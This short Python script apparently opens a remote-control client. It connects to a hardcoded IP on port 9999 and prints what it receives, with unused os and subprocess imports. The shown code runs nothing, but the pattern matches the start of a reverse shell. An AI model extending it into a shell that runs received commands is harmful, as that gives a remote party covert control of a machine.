import socket
import os
import subprocess

s = socket.socket()
host = '142.68.49.31'
port = 9999

s.connect((host, port))

data = s.recv(1024)
print(data.decode("utf-8"))
